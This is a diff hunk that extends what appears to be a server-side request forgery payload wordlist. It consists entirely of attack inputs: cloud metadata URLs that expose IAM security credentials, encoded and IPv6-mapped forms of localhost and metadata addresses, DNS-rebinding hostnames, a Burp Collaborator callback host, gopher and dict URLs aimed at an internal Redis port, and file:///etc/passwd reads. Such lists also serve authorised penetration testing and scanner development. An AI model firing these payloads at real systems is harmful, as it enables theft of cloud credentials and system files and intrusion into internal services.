@@ -296,3 +296,24 @@ file:///etc/passwd
 jar:file:///etc/passwd!/
 netdoc:///etc/passwd
 
+# Cloud metadata IP bypasses
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/
+# IP obfuscation
+http://127.0.0.1
+http://0x7f000001
+http://2130706433
+http://017700000001
+http://[::ffff:169.254.169.254]
+http://[::ffff:127.0.0.1]
+http://localtest.me
+http://spoofed.burpcollaborator.net
+# DNS rebinding
+http://1.0.0.127.nip.io
+http://127.0.0.1.xip.io
+# Alternative protocols
+gopher://127.0.0.1:6379/
+dict://127.0.0.1:6379/
+file:///etc/passwd
